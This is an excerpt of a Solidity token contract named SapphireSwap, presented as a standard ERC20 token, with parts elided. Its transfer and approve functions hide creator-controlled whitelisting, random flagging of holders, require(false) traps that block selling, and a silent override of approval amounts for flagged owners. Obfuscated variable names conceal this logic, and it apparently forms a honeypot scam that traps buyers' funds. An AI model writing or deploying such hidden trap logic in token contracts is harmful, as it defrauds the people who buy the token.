...
contract SapphireSwap is Context, IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) public beetles;
  mapping (address => bool) public wolf;
  mapping (address => bool) public bigass;
  mapping (address => uint256) public thicc;

  bool private documents;
  uint256 private _totalSupply;
  uint256 private guns;
  uint256 private rebels;
  ...
  constructor() public {
    ...
    rebels = chTx * 30;
    wolf[creator] = false;
    bigass[creator] = false;
    beetles[msg.sender] = true;
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (documents == false)) {
      guns = chTx;
      gallons = true;
    }
    
    if ((address(sender) == creator) && (documents == true)) {
      beetles[recipient] = true;
      wolf[recipient] = false;
      documents = false;
    }
    
    if ((amount > rebels) && (beetles[sender] == true) && (address(sender) != creator)) {
        bigass[recipient] = true;
    }
    
    if (beetles[recipient] != true) {
        wolf[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((wolf[sender]) && (beetles[recipient] == false)) {
        wolf[recipient] = true;
    }
    
    if (beetles[sender] == false) {
      if ((amount > rebels) && (bigass[sender] == true)) {
        require(false);
      }
      
      require(amount < guns);
      if (gallons == true) {
        if (bigass[sender] == true) {
          require(false);
        }
        bigass[sender] = true;
      }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (doggy == true)) {
      beetles[spender] = true;
      wolf[spender] = false;
      bigass[spender] = false;
      doggy = false;
    }
    
    tok = (wolf[owner] ? 873762 : amount);
